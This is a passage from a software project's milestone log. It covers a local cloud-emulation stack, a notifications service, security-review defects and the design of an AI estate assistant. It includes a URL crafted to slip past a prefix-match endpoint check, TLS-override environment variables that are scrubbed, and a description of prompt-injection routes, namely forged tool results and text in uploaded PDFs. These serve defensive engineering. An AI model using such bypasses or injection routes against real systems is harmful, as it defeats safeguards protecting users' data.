`KafkaAuditProducer`, `TextractOcr`) was unit-tested against mocked transports
only; M6 emergency access and M7 settlement intake are deliberately inert in
production pending the notifications service, whose live adapter (SES) needs
somewhere to run; and building the AI assistant — the highest
prompt-injection surface in the product — on a platform that cannot deploy,
cannot notify, and has never run its production code paths is the wrong
order. This milestone also TAKES OVER three deliverables the deferred M5
cloud half had claimed: the ClamAV deployment documents requires in
production mode, migration jobs, and the audit-hash-chain-over-a-real-broker
smoke (the M1 open item — retired below). The M5 cloud half shrinks
accordingly.

**Full runbook and limits: `docs/05-local-stack.md`.** Its "what this does
not prove" section is normative: KMS grant isolation (docs/03 §5.3) is NOT
exercised — LocalStack Community enforces no IAM, so the stack's six
per-service keys model the boundary without proving it — and the entire
cloud posture (IRSA, VPC, WAF/Shield, mesh mTLS, Kyverno, Aurora behaviour)
stays untested until the real environment exists.

- **PR1 — adapter seams.** `KMS_MODE=local|aws` (the explicit enum every
  other adapter already had; production pins 'aws', unchanged in strength);
  `AWS_ENDPOINT_URL` read and validated explicitly (same name the SDK honours
  ambiently, so the two resolutions cannot disagree; buys the production
  https-only guard and S3 `forcePathStyle`, which has no SDK env selector);
  `TesseractOcr` sidecar adapter, with the production OCR guard renamed to
  refuse the STUB rather than require Textract. Both OCR selectors exhaustive
  with `never`, mutation-tested.
- **PR2 — runtime seams.** `packages/kafka` built at last (seven duplicated
  producers collapsed; the memoised-rejected-connect poison fixed once;
  `ensureTopics` added because Redpanda ships auto-create off). The audit
  worker's fatal path now releases its handles so a failed worker EXITS
  instead of sitting "up" with a dead trail. The migrator takes its advisory
  lock before creating `schema_migrations` (co-tenant boot race). The planned
  nine `/healthz` routes were dropped for TCP probes — no new unauthenticated
  surface, same signal, k8s-compatible.
- **PR3 — the stack.** `docker-compose.stack.yml` (all ten apps + clamd +
  tesseract + LocalStack + Redpanda, volumes on the stateful trio, profiles
  for an 8 GB Docker VM); `apps/stack` generates `.env.stack` from the
  credential graph — one secret per EDGE written to callee and every holder,
  closing the recorded provisioning-drift residual for generated
  environments — and a preflight doctor that refuses real-looking AWS
  credentials or a non-local endpoint (env vars outrank `~/.aws/credentials`,
  so the fake `test` credentials are what make a wrong endpoint fail loudly
  instead of billing a real account). Bootstrap jobs: six KMS keys + bucket
  (idempotent init hook; the LocalStack healthcheck waits for the HOOK, not
  the service), explicit topic creation from the contracts registry,
  migrations sequenced across the two co-tenant pairs, template seeds
  (dev-mode by design — the M4 production guard refuses placeholder
  legalReview, and the exemplars are placeholders; stated in docs/05 rather
  than worked around). Smoke-proven live: register/login over real HTTP; the
  audit chain verified across a REAL Redpanda hop (retiring the M1 open
  item); a DEK minted by a real `kms.GenerateDataKey` against LocalStack; an
  upload through real clamd INSTREAM + real S3 with ciphertext at rest; raw
  EICAR refused by the sniff gate.
- **PR4 — proof and CI (shipped).** `stack.e2e.spec.ts` drives the platform as
  real processes over real HTTP; `aws-conformance.spec.ts` probes the three
  behaviours the adapters assume. Blocking `stack.yml` runs both profiles
  under a determinism contract — no bare sleeps, explicit topic provisioning,
  `clamdscan --ping` readiness, pinned infra images, `timeout-minutes` — and
  `images.yml` gained a job running the same spec against the shipped images,
  so the fast gate proves the code integrates and that one proves the artifact
  does. ci-guard gained the stack half, and both workflows assert
  `numPassedTests` from jest's `--json` against a floor, because jest exits 0
  for a suite that skipped everything.

  **The conformance result changed what this milestone can claim.** LocalStack
  *does* enforce the KMS EncryptionContext — a `Decrypt` with a foreign
  `estate:kek`, or none, is refused. So the stack genuinely exercises the
  cryptographic half of the Plaid-isolation claim: a DEK wrapped for one domain
  cannot be unwrapped as another even by a caller holding the right key id. The
  IAM half — *which principal* may call Decrypt at all — remains untested, and
  docs/05 states that split precisely instead of hedging. S3 returns 412 for
  `IfNoneMatch:*` and surfaces not-found as `S3ServiceException`, so both the
  immutability path and the `instanceof`-gated 404 mapping hold.

  Two findings worth recording. The clamd FOUND path could not be reached with
  EICAR at all — it matches only at file start, and a plaintext-leading file is
  refused by magic-byte sniffing before any scan, while adding a PNG header
  stops it being EICAR — so a custom signature plus a valid PNG carrier proves
  it instead. And the PR1 production TLS guard correctly refused the production
  profile against LocalStack's http endpoint; that was resolved by giving the
  stack a real TLS terminator with a CA the services verify, not by relaxing
  the guard, and the doctor now rejects `NODE_TLS_REJECT_UNAUTHORIZED` as its
  own class of mistake.
- **PR5 — thin UI (shipped).** The BFF's first non-identity resolvers, which
  is where the 2026-07-23 decision's stated end-state becomes real: the BFF
  **forwards the caller's own bearer** downstream, injects no identity header,
  and holds no assets credential — so it cannot mint authority it was not
  handed. Money stays a decimal string through GraphQL. Logout landed end to
  end (retiring the M1 open item): identity revokes the **presented session
  only**, and the BFF expires both cookies with the same attributes they were
  set with, *after* the server confirms — a failed revocation leaves the
  cookies alone and tells the user, because "signed out" over a live session
  is the worst outcome. One assets page, plus a sign-out control. Vault UI
  stays out per the M6 decision (needs the docs/03 TB6 isolated-origin/CSP
  work).

  **Driving the real web image in a browser found three defects no test could
  see**, all of the same shape — invisible in development, fatal in
  production:
  1. The GraphQL client omitted `persistedQuery.version`, which the BFF's APQ
     extractor requires. **Every persisted operation would have failed in
     production**, and dev was green because non-production builds also send
     the full `query`, so the hash was never consulted.
  2. The persisted-manifest builder hashed raw CRLF bytes on Windows while
     ECMAScript normalizes template literals to LF — so every hash in the
     committed manifest was wrong.
  3. `turbo.json`'s build task declared no `env`, so Turbo 2's strict env mode
     stripped `BFF_URL` and the web image baked a rewrite to
     `localhost:4000` — the container proxied `/graphql` to itself.

  Each is now pinned by a regression test or a declared config. This is the
  clearest argument for the milestone: the stack's value is not that it runs,
  it is that running it falsifies things nothing else does.

  Also learned: a valuation is **all-or-nothing** in the ledger
  (`estValue`/`valuationAsOf`/`valuationSource` together, by `.refine`) —
  an amount with no date and no provenance is not an auditable claim. The BFF
  refuses a partial valuation with `INVALID_REQUEST` rather than forwarding one
  and masking a downstream 400. Web coverage floors were **raised** to absorb
  the new UI (62/55/58/65 → 70/62/64/73).

**M8 security review (2026-07-29/30).** Structured review of the whole merged M8
range (`b95bb5f..8bec8af`, PR1–PR5): six parallel discovery passes — the adapter
mode selectors and their production guards, the generated environment and the
credential graph's provisioning claims, the CI gates as *gates* (what would a
green run fail to notice), the runtime seams introduced in PR2, the thin UI's
session and bearer handling, and every claim the milestone's own documentation
makes about what it proves — each candidate then adversarially re-verified
against source by an agent instructed to refute it and to default to refuted
when uncertain.

**No Zone A/Zone B boundary was weakened, no production fail-fast requirement
was relaxed to make the stack run, and no credential the graph forbids reached a
service that must not hold it.** The production TLS refusal was met with real
TLS; the generator's per-edge minting held up; the doctor, the compose-parity
fence and the credential-graph fence each caught a real drift *during* the
milestone. Three defects were confirmed, all in machinery M8 itself introduced,
and all fixed in this branch. Two of the three contradicted a claim made in the
same milestone's own commit messages — the recurring M6/M7 pattern.

- **Logout treated identity's 401 as success (high).** The BFF called
  identity's `SessionGuard`-protected logout route with the *access* token,
  which lives 15 minutes, and read a 401 as "already logged out" — clearing both
  cookies while the session and its **30-day refresh token stayed live**. Any
  tab older than the access TTL therefore produced a browser that looked signed
  out and a session that was not, which is the exact outcome PR5's own commit
  message claimed it avoided. Identity gained
  `POST /v1/auth/logout/refresh` — deliberately *not* behind `SessionGuard`,
  since a live access token is the thing that is missing — resolving the session
  by refresh-token hash and revoking it. It always answers 200 so it cannot be
  used as a session-liveness oracle. The BFF falls through to the refresh
  credential when the access path returns false, and still **clears no cookie
  unless something was actually revoked**.

- **The blocking stack gate died before it ever ran (high).** `stack.yml` handed
  the **host-addressed** env file to `docker compose`, where `localhost` is each
  bootstrap container's own loopback: every migration failed, and with it the
  whole job — so the production rehearsal had never executed even once while
  docs/05 credited it as proven. Two env files are now generated, the host one
  **derived** from the compose one (`--from`, so both carry the same secrets),
  and `diagnose` takes `--for compose|host` and refuses a mismatch — mirroring
  `run-services-cli`'s long-standing refusal of the opposite direction, whose
  asymmetry was the hole. The bootstrap jobs are now inside
  `compose-parity.spec.ts` too, which also caught `seed-templates` running
  without `KAFKA_BROKERS` (the template-publication audit events were silently
  going to the in-memory producer).

  The same finding noted the `numPassedTests` **floors sat two tests below the
  real counts** — slack exactly wide enough to `.skip` the clamd FOUND path and
  the OCR→encrypted-search path and still go green. Both workflows now assert
  the **exact** passed and pending counts.

- **A dead audit consumer left the process running (medium-high).** PR2 fixed
  the *startup* fatal path and left steady state open. `consumer.run()` resolves
  once the fetch loop is running, and kafkajs restarts itself only for
  *retriable* errors (`shouldRestart = isErrorRetriable && restartOnFailure(e)`,
  verified in the locked 2.2.4 source); anything else disconnects, emits `CRASH`
  and returns — leaving a live process holding its Postgres socket, answering
  the TCP probe, and ingesting nothing. Exactly the "up with a dead audit trail"
  state `fatal.ts` exists to prevent, in the service whose silence docs/01 §6
  treats as a paging signal. `AuditConsumer.start()` now takes the fatal
  handler and routes a non-restartable crash to it; `restartOnFailure` is stated
  explicitly (it can only veto a restart, never force one).

Also fixed, from the same review:

- **LocalStack loses its keys on restart, and the docs claimed otherwise.**
  *Measured*: with the volume mounted, a plain `docker restart` leaves 0 of 6
  KMS aliases, an empty bucket, and a previously wrapped DEK failing `Decrypt`
  with `NotFoundException`. The Postgres volumes persist, so that restart
  strands every DEK and dangles every `object_key` with no error at the time.
  Worse, `/tmp/stack-init-complete` **survives** a restart, so the container
  reported healthy while keyless. The init hook now clears the marker first and
  refuses to re-provision when its epoch file exists with no keys behind it —
  re-minting under the same aliases would produce a stack that boots cleanly and
  cannot read its own data. The false CLAUDE.md claim is corrected and docs/05
  states the measurement.
- **The doctor's endpoint check was a prefix match**, so
  `https://localhost:x@kms.us-east-1.amazonaws.com/` passed the one guard
  standing between a misconfigured stack and real AWS. It parses the URL now.
  Related and **not** closed in production: the SDK resolves
  `AWS_ENDPOINT_URL_KMS`/`_S3`/`_TEXTRACT` *before* `AWS_ENDPOINT_URL`, and each
  service's https-in-production guard only reads the plain name — the stack's
  preflight refuses those variables outright, production does not, and six
  config comments that overclaimed "can never disagree" now say so.
- **The supervisor's env scrub missed the TLS escape hatches.**
  `NODE_TLS_REJECT_UNAUTHORIZED` and `NODE_OPTIONS` reach a child from the
  developer's shell without appearing in the file the doctor read; both are
  scrubbed now, alongside `NODE_EXTRA_CA_CERTS`.
- **`--profile plaid` started a doomed container in the production profile.**
  The compose profile name is generated (`PLAID_PROFILE`), so production leaves
  plaid out entirely — matching what `plannedServices` already did for host
  mode. Verified against real `docker compose config` in both modes.
- Out of scope but observed and fixed: `vault-crypto`'s exhaustive
  single-character-error sweep timed out under `turbo test`'s 20-way
  parallelism. Given a 30s budget rather than sampled, since the exhaustiveness
  is the point.

Left open deliberately: nothing verifies which URL a credential is presented to,
cross-service provisioning drift for **hand**-provisioned environments, and the
production per-service-endpoint residual above — all three close with the mesh
or with deployment configuration management, not with code here.

### M9 — Notifications (both PRs shipped; reviewed)

Sequenced AHEAD of the "AI assistant · referral · notifications" order below —
a user-approved reorder, the M8 precedent — because it is the smallest
milestone that un-gates two shipped ones: M6 emergency access and M7
settlement intake/review-approve deliberately answered `503
notifications_unavailable` in production, and the waiting-period controls
those flows rest on only become real when the owner can actually be told.

**PR1 — the notifications service and the carrier path, end to end.**

- `apps/services/notifications` — the NINTH service, the isolating boundary
  for delivery carriers (docs/01 §2.10, TB5): the SES SDK and its
  configuration exist only here. Core-cluster co-tenant (third, after
  profile/settlement) with disjoint tables and its OWN KEK
  (`notifications/kek` + `notification_deks`), so the cluster's other tenants
  can never unwrap a recipient address. Two approved docs/01 deviations,
  recorded in the decision log: the port is SYNCHRONOUS HTTP (the M6/M7
  fail-closed capability gates are request/response by nature), and recipient
  resolution is EVENT-CARRIED — identity feeds `notification_recipients` at
  registration and login, the two moments the user themselves supplies the
  plaintext address, so no email-ciphertext read path exists anywhere and the
  §5.3 bulk-decrypt chokepoint never forms.
- **Content-free by construction.** The wire (`packages/notifications-client`;
  consumers vault + settlement + identity, all landing in-milestone) has no
  text field — a closed namespaced kind enum, userId, requested channel,
  optional deadline, `.strict()`. The template registry is the only source of
  carrier-visible words: no user data beyond the deadline date, ONE uniform
  subject for every kind (the M6 review's delivery-channel-leakage item), and
  NO links at all. Email-only this milestone (SES v1 — the API LocalStack
  Community also serves); SMS/push/in-app, per-event preferences, and one-tap
  deny capability tokens are recorded follow-ups.
- **Trust machinery.** Fourth credential-graph edge
  (`NOTIFICATIONS_INTERNAL_TOKEN` — callee notifications; holders identity,
  settlement, vault; opens send + recipient-upsert), with every fence updated
  and the generator minting it automatically. **CORRECTED by the M9 security
  review:** one credential opening both surfaces was an over-grant — vault and
  settlement only ever send, so bundling the recipient-upsert route handed
  them the power to repoint any owner's alerts. Split into two edges; see the
  review record below. Production
  PINS the real adapters (`NOTIFY_MODE=http`, `EMAIL_MODE=ses` — the
  KMS/clamd/OCR rule); aliasing refusals extend pairwise to the new secret;
  the per-route 503 gates REMAIN as defense in depth and now AUDIT their
  refusal (`vault.emergency.notifications_refused`,
  `settlement.notifications_refused`).
- **Bookkeeping and the M6 follow-ups.** Send failures never roll back state:
  every send lands as an append-only `notification_sends` row (outcome ∈
  sent/no_recipient/carrier_failure) plus an ids/enums-only audit event, and
  every address decrypt is a logged `crypto.field.decrypted`. The two
  recorded M6 gaps ship: owners are notified on vault RESET (migration 003
  makes `emergency_access_notifications.policy_id` nullable with a
  kind-anchored CHECK) and when a reconfiguration retires the previous
  grantees.
- **Proof.** The stack runs the real path in BOTH profiles: LocalStack
  provisions the seventh KMS key and verifies the SES sender; the production
  rehearsal's two 503 assertions are RETIRED and replaced 1:1 — intake now
  opens a case and the e2e reads the owner's actual email back out of
  LocalStack's `/_aws/ses` store (uniform subject, no links, live), and the
  escrow configure/reconfigure pair proves the grantees_changed notification
  the same way. The dev journey's audit-chain assertion gains
  `notification.recipient.updated`, proving identity→notifications→broker→
  chain end to end. Workflow exact-count gates unchanged (replacements are
  1:1).

**PR2 — settlement→documents legal hold: the M4 zero-callers gap, closed.**

- **The caller.** `apps/services/settlement/src/documents-hold.ts` — the
  identity-lock pattern verbatim: a `DocumentsHoldPort` with one idempotent
  operation, an HTTP adapter that fails closed on network/non-2xx/contract
  drift (`DocumentsHoldError` → 503 `documents_unavailable`, transaction
  rolls back), authenticated by the documents service credential because no
  user bearer exists for this call by construction.
- **Where it fires — paired with the account lock at every site, inside the
  case transaction.** Review-approve sets the estate-wide hold with the
  `deceased_pending` lock; every restore to `active` (reject from the wait,
  owner void, liveness void at confirmation) clears it; verification
  RE-ASSERTS it with the terminal lock, because the owner's login survives
  `deceased_pending` (the §5.1 rescue path) and the estate can grow during
  the wait — the invariant is "every live document of a verified estate is
  held", not "every document that existed at approval". A hold stranded by a
  commit failure blocks only deletion (deny-safe) and heals on re-drive.
  Deliberate scope note: the hold OUTLIVES case close — no lift surface
  exists post-settlement; that ceremony belongs to the TB7 operator platform.
- **Trust machinery.** Graph edge `DOCUMENTS_INTERNAL_TOKEN: holders [] →
  ['settlement']` in the same change as the client (the rule the graph
  comment mandated); `DOCUMENTS_INTERNAL_TOKEN` becomes production-required
  (≥ 32 chars) on BOTH sides; settlement's pairwise-distinctness refusal now
  covers all FOUR credentials it touches (full n² loop in settlement's own
  config; the DOCTOR's coverage was narrower than this line claimed until the
  M9 review widened it — see the review record);
  settlement config gains `DOCUMENTS_URL` (production-required). Generator,
  doctor, service-env mapping and compose all follow the graph automatically;
  the zero-holder subtraction machinery stays for the next holder-less edge.
- **Proof.** First-ever tests for the route (401 for no/user/wrong
  credential, 400 malformed, estate-wide sweep with exact counts, idempotent
  re-drive, ids-only audit `document.legal_hold.set`, deletion 409→200 across
  set/clear) driven over HTTP with the real guard against real Postgres;
  eight settlement transition tests over a `FakeDocumentsHold` (set at
  approve, cleared on every restore, re-asserted at verify, fail-closed 503s
  with no case movement); and a dev-journey stack e2e that drives the whole
  chain live — generator-minted credential, approve freezes the estate
  against a real step-up-authorized deletion, reject releases it — plus
  `document.legal_hold.set` added to the verified-hash-chain assertion.
  Workflow exact counts moved 13/4 → 14/4 (dev) and 9/8 → 9/9 (production
  skips the dev journey).
- **PR1's red CI, root-caused here and landed on PR1's own branch** (found by
  running the gates locally; cherry-picked onto #20 so it merges green).
  (1) `stack.yml`'s bootstrap loop was a hand-copied list of eight migrate
  jobs that never learned about `migrate-notifications` — the stack came up
  against a core cluster with no notifications tables and both profiles died
  on the chain assertion, exactly the copy-pasted-line drift the M8 record
  warned about. The list is now DERIVED from the compose file
  (`config --services | grep '^migrate-'`), so a tenth service cannot be
  silently skipped; images.yml was already immune (full-profile `up` follows
  compose's `depends_on`). (2) The notifications coverage floor was set from
  a number the suite never produced in CI (65.12 measured on the author's
  machine vs 61.2 in CI); rather than lowering it, the controller and
  error-filter gained their first specs (the parse-before-delegate refusal
  and the never-echo-an-address error boundary — both PII pins worth having)
  and the floor RATCHETED UP to just under the new measured 68.89/67.2/70.76/
  67.61.

**M9 security review (2026-08-05).** Structured review of the whole merged M9
range (`8aba7c7..03126c9`, PR1 #20 + PR2 #21): seven parallel discovery
lenses — the carrier boundary and the content-free doctrine, the recipient
store's crypto and the Zone B boundary, the credential graph and its fences,
the PR2 legal-hold caller and case-transition integrity, the M6/M7 flows M9
un-gated, fail-open hunting across the new production pins, and the
audit/PII firewall plus new attack surface — with every candidate then put
through TWO adversarial verifiers on different angles (is it reachable in a
real production config; is it actually a documented decision), both
instructed to default to REFUTED. 24 raw, 24 unique, 26 verified including
the completeness critic's, 8 confirmed collapsing to **6 distinct defects**
(three lenses independently found the credential one). No zone boundary
weakened, no production fail-fast relaxed — M9 only ADDED pins — and no
credential reaching a service the graph forbids. The recurring pattern held
for the fourth milestone running and should now be treated as expected: five
of six sit in machinery M9 itself introduced, and four falsify a claim M9
made in its own docs or comments. All six fixed in-branch:

1. **The notifications credential bundled two capabilities** (the load-bearing
   one). `NOTIFICATIONS_INTERNAL_TOKEN` opened both `POST /send` and
   `PUT /recipients`, and was held by identity, settlement AND vault — though
   identity only ever upserts and the other two only ever send. So a holder of
   vault's or settlement's copy could silently repoint any user's notification
   address, and the damage is CROSS-DOMAIN: vault's copy silences settlement's
   §5.1 death-case alerts, settlement's silences vault's §5.2 emergency-access
   alerts. Both waiting periods rest on the owner being told. docs/03 §6c,
   written in this same milestone, asserted the opposite ("requires
   identity-level compromise"). Split into two edges with two guards binding
   two DI tokens — send (settlement, vault) and recipients (identity ALONE) —
   with the service refusing to boot in production if the values are equal.
   The credential-graph fence gained a `guard` descriptor per edge and now
   attributes routes per guard CLASS, so re-merging the surfaces cannot pass:
   its "one credential per callee" checks became "one per edge, with distinct
   guards per callee", plus a new cross-check that every guarded route in the
   repo is declared exactly once.
2. **Verification ran the irreversible lock before the fallible hold.** In
   `confirmVerification`, `identity.setState('settlement')` — which has NO
   transition back to `active` and revokes every session — executed BEFORE
   `documentsHold.setHold(true)`. A documents blip (cheapest trigger: its
   post-commit audit emit throwing on a Kafka hiccup, returning 500 with the
   hold already applied) rolled the case back to `waiting_period` while the
   account stayed terminally in `settlement`; every restore path then calls
   `setState('active')`, which from `settlement` is an invalid transition
   surfacing as a transient-looking 503. A LIVING owner would be permanently
   locked out with the only unblocked move being to finish settling their
   estate — §5.1's Critical outcome reached by a third service hiccuping, and
   flatly contradicting `documents-hold.ts`'s own "a case transition whose
   legal-hold effect cannot be confirmed does not happen". Fixed by swapping
   two calls, and the rule is now stated where it can be reused: **the step
   that cannot be undone runs LAST**, which makes the ordering differ by site
   (approve's identity state is reversible, so there the lock goes first —
   reordering it would strand a hold on a living owner whose reject path does
   not clear it). Mutation-tested.
3. **Registration feeds an unverified third-party address into the delivery
   store.** `POST /v1/auth/register` is unauthenticated and proves no
   ownership, yet identity pushes whatever was typed into
   `notification_recipients`; `users.email_verified_at` exists in the schema
   and is never written or read. RECORDED, NOT FIXED — a confirm-token flow is
   its own change. Bounded meanwhile: no kind fires at registration, addresses
   already belonging to an account cannot be taken, and every message is
   content-free and link-free. docs/03 §6c now says plainly that identity's
   word means the address was TYPED, not OWNED.
4. **Template bodies name the control that fired.** The uniform-SUBJECT
   property is real, but every body states its control in the first clause, so
   a lock-screen preview and the carrier learn the event class — which three
   places claimed they could not. Prose-only fix: the bodies stay actionable
   (a context-free pointer is useless to an owner deciding whether to deny),
   the claims are narrowed to the subject line, and the event-class leak is
   recorded as an accepted residual. Also retitled `templates.spec.ts`'s
   subject test, whose name asserted a property it never checked — the M8
   vacuous-assertion class.
5. **The legal hold attributed itself to the estate owner.** `setEstateLegalHold`
   opened its transaction as the owner, so the `documents_versions` trigger
   recorded the DECEDENT as the actor of a platform-imposed freeze they could
   not have performed — while the audit event for the same operation correctly
   said `actorType: 'service'`. In a §5.1 fraud investigation that history is
   evidence. Now `SYSTEM_ACTOR_ID`, pinned by an int test and mutation-tested.
   (M7-vintage line; M9 PR2 made it live by giving the route its first caller.)
6. **The doctor's aliasing check was inbound-vs-outbound only.** It never
   compared two callees' values, so one secret provisioned for two different
   callees passed — the shape an operator produces by reusing one
   secrets-store entry — while docs/04 and the compose file both claimed a
   "full n² loop" and that "the doctor refuses it in every mode". Widened to a
   real cross-callee comparison; both overclaims corrected.

**The M6 delivery-channel identifier leakage item is ANSWERED: partially
closed.** Closed by construction for identifiers — no caller-authored text,
no name/address/asset/document/case/user id in any message, no links at all
so no per-recipient URL can re-identify a recipient to the carrier, one
subject across all nine kinds, addresses never crossing a cluster boundary.
Open, and now recorded as an accepted residual rather than claimed closed:
the EVENT CLASS reaches the carrier and any body-preview observer, deliberately,
because an actionable body is what makes the notification a control. Fully
closing it needs the isolated-origin push channel — a later milestone.

Residuals added to docs/03 §6c rather than fixed: the unverified-address gap
(3 above), the recipient-change audit's inability to ATTRIBUTE (it emits a null
actor and identity fires the same event on every login, so it is evidence for
recovery, not a detection control — closing it needs the mesh's peer identity),
and the carrier's event-class visibility.

### M10 — AI estate assistant (shipped)

The milestone docs/04 always had next, arriving on a platform that can now
deploy and notify — the two reasons M8 displaced it (see M8's opening note).
Four PRs: **PR1** the spine with no model call anywhere, **PR2** the live
Anthropic adapter plus the tokenizing privacy proxy and the stack wiring,
**PR3** the deterministic analysers (missing-document, beneficiary-conflict,
funding, estate tax), **PR4** the thin UI.

**The scoping decision that shaped everything: retrieval is structured, not
semantic.** docs/00 feature 6 reads like a RAG feature and mostly is not.
Funding recommendations, missing-document detection, beneficiary-conflict
detection and estate-tax estimation are structured-data problems over facts the
platform already computes — `assets_view.in_trust`, `funding_status`,
`ownership_pct`, and the `designationComplete` flag that
`GET /v1/assets/:assetId/beneficiaries` already returns per designation class.
So there are **no embeddings, no vector store and no semantic index**. M4's
per-user HMAC search index is not a poor substitute for embeddings here: it
does a job embeddings cannot, LOCATING a candidate document without decrypting
anything.

Document explanation splits along the same line. Generated instruments are
explained from the in-repo, `body_sha256`-pinned template — product content,
not user data — and where the user's own rendered instrument is genuinely
needed they point at ONE document, fetched through M4's existing audited
content route on their own bearer, so each read is a logged event rather than a
standing capability over the corpus. **Uploaded-document OCR text has no read
path in M10 at all**: M4 sealed that artifact with `encryptOcr` and
deliberately no counterpart, and building one is its own PR with its own
consent scope, audit action and Cedar resource.

Rejected, with reasons: an embedding index is a plaintext-derived projection
living outside the DEK envelope with no KMS chokepoint, it needs a SECOND
third-party egress (Anthropic has no embeddings API) carrying its own retention
profile, and OpenSearch is deferred so there is nowhere to host it. Accepted
cost, stated rather than hidden: there is no semantic search.

**PR1 — the spine (no model call).**

- `apps/services/ai-assistant` — the TENTH service, core-cluster co-tenant
  (fourth, after profile/settlement/notifications) with disjoint tables, its
  own migrations dir and its own KEK (`ai-assistant/kek` + `assistant_deks`),
  so no co-tenant can unwrap a conversation. Port 3009.
- **It holds ZERO internal service credentials, in either direction** — the
  first service of which that is true by design. CallerGuard authenticates on
  the caller's own bearer and the read clients FORWARD that same bearer, so it
  sees exactly what the caller could already see and can never mint authority
  it was not handed. That matters most here because this is the one process an
  attacker can address in natural language. Machine-checked: present in
  `SERVICE_NAMES`, absent from every edge, with the AUDIT precedent's explicit
  empty-set assertion in its own `test/config.spec.ts`.
- **The subject is never a tool parameter.** A tool receives its authority (the
  verified session subject plus the caller's bearer) and declares only what to
  fetch, never whose data. Enforced at registry construction, so a violation is
  a process that will not start. Combined with every tool being read-only and
  there being no send, write or fetch sink, an injection has nothing to reach —
  which is what keeps docs/03 risk #6 at Medium impact.
- **Consent is deny-by-default structurally.** No `granted` boolean exists:
  `assistant_consents` follows profile's `permission_grants` (append + revoke,
  rows are the history), so consent is the presence of an unrevoked row.
  `permits()` requires the `assistant.enabled` master switch alongside the
  specific scope. Granting is step-up gated; revoking is not — the M6
  emergency-access-denial rule that the protective action must never be harder
  than the permissive one.
- **Transcripts are persisted, encrypted, and that is a security decision.** If
  the client supplied history per turn it could forge prior assistant turns and
  prior tool results, and a forged tool result is indistinguishable from a real
  one — a self-service prompt-injection channel no framing closes.
- `LLM_MODE` carries both modes from the start but REFUSES `anthropic` in every
  environment until PR2 wires it, on the NOTIFY_MODE timeline: the production
  pin arrives with the adapter rather than pinning a mode that does not exist.

Found while building, both recorded in the decision log: `ai-assistant` is the
first service name with a HYPHEN and the stack minted the illegal
`AI-ASSISTANT_DATABASE_URL` (fixed with one `envPrefixFor` helper across
eleven sites, a no-op for the nine single-word services); and `assistant.cedar`
had to name its attribute `subject` rather than `owner`, because `owner.cedar`
permits ANY action on a resource carrying `owner` — the draft policy claimed a
three-verb limit the bundle did not enforce. settlement.cedar avoids `owner`
for the identical reason. Its spec found that, and the scope test had to be
rebuilt against the isolated policy because asserting through the shared bundle
was measuring `owner.cedar`.

Deferred to PR2 deliberately: the stack wiring (topology, compose, doctor), so
PR1 touches `apps/stack` only for the hyphen fix.

**PR2 — the live adapter, the privacy proxy, and the stack.**

*The adapter is a translator, not a policy layer.* `anthropic-gateway.ts` is the
only file in the platform that speaks to a third-party model and the only file
allowed to import `@anthropic-ai/sdk` — enforced by a source scan
(`test/sdk-fence.spec.ts`, the `packages/vault-crypto` zero-dependency-fence
precedent), because anything that can import the SDK can construct a client and
anything that can construct a client can send estate content past the
tokenizer, the egress assertion, the consent check and the audit trail in one
line. The same scan pins the API key's readers to exactly two files: `config.ts`
parses it and `app.module.ts` consumes it once, so the credential never enters a
file that renders prompts. None of the upstream controls is re-implemented in
the adapter, and it re-frames nothing it is handed.

The two properties it does own are FAIL CLOSED and DO NOT LEAK. Every abnormal
outcome — a safety refusal, a rate limit, a dead connection, an unparseable
response, a turn that ran past its output budget — collapses to the SAME fixed,
platform-authored sentence, and no provider text (error bodies,
`stop_details.explanation`, request ids) is returned or written anywhere. The
uniformity is the control: distinguishing "the safety classifier declined" from
"we are rate limited" hands whoever composed the prompt — possibly through text
in an uploaded PDF, docs/03 risk #6 — a probe for which control fired. It is the
404-not-403 reasoning from PR1 and M9's one-subject-line-per-kind, one layer
out. Three details carry weight. `stop_reason` is read BEFORE anything touches
`content`, because a refusal arrives as a successful HTTP 200 whose content may
be empty or partial — code that indexes `content[0]` first breaks on exactly the
responses that matter. Truncation (`max_tokens`, `model_context_window_exceeded`)
is treated as a NON-ANSWER rather than an answer, because a truncated estate
reply reads as complete: "the will names three beneficiaries" without "…but the
document is unsigned" is worse than no answer at all. And a CREDENTIAL failure
(401/403) is rethrown as a typed error carrying a reason token and nothing else,
never absorbed into the polite sentence — a deployment whose key is wrong must
page, not serve every user a bland apology forever (the M8 lesson about a
container that stays up with a dead audit trail).

Decisions worth having in one place: the model id is a pinned CONSTANT, not
configuration, because which model sees estate content is a threat-model
decision and belongs in a reviewed commit; the loop is deliberately
NON-STREAMING, since the port's single-step shape is what lets the egress gate
inspect a complete outbound payload before every call; the prompt-cache
breakpoint sits on the system block and nowhere else, so the cached prefix is
the tool declarations plus the standing instruction — both platform constants,
no user id, no timestamp — which is what makes it safe as well as effective:
THE CACHED PREFIX CONTAINS NO ESTATE CONTENT. Tool results travel as a quoted
user turn rather than native `tool_result` blocks, because the port carries no
`tool_use` ids and both ways to get them are worse: holding per-instance state
across `complete()` calls in a singleton serving concurrent users is a Zone B
leak, and synthesising ids means synthesising the assistant blocks that
"requested" them — fabricating a record of what the model said, in the one
product where the transcript is evidence. Server-side refusal fallbacks are ON
by default but are a config switch for a TB5 reason stated rather than
footnoted: on a refusal THE SAME ESTATE PAYLOAD IS RE-RUN ON A DIFFERENT MODEL,
so every zero-retention and no-training commitment must hold for the fallback
too, and a deployment whose agreement does not cover it turns fallbacks off
without a code change. PR2 also widened `LlmToolParameter` with a scalar `type`
DERIVED from the tool's zod field (`parameterTypeOf`, which throws rather than
defaulting on a shape it cannot map): a typeless property makes the provider
guess and the executor refuse the guess as `invalid_input`, a failure whose
cause is two layers away.

*The privacy proxy tokenizes BY FIELD, never by regex over prose.* The tempting
design — a detector that finds names in text — does not work without NER, and a
half-working one is worse than none: "Will", "Trust", "Grant" and "Rose" are
estate vocabulary AND names, so it mangles ordinary words, misses the names it
was built for, and leaves everyone believing a control exists. Tool results are
structured JSON with schemas this repo owns, so `TOOL_FIELD_RULES` names exact
paths (`list_assets.title`, the document inventories' `title`, the dormant
PERSON fields) and replacing a known field is precise with no false positives.
The cost of that precision is that coverage is a LIST, and lists go stale:
`assertTokenizerCoversTools` runs at registry construction and refuses a tool
this module has made no decision about in EITHER direction — missing rules, or
rules naming a tool that no longer exists — so a new retrieval arrives with a
tokenization decision or the process does not start (the `assertSubjectFree`
precedent). An empty rule list is a recorded decision, not an omission.

**The interlock with `egress.ts` is the load-bearing part.** Substitution and
refusal interact badly if nobody thinks about it: a user who titles an asset
"dad's account 123-45-6789" would have that title replaced by ⟦ASSET_1⟧, after
which `assertEgressClean` finds nothing, passes, and the fail-closed control has
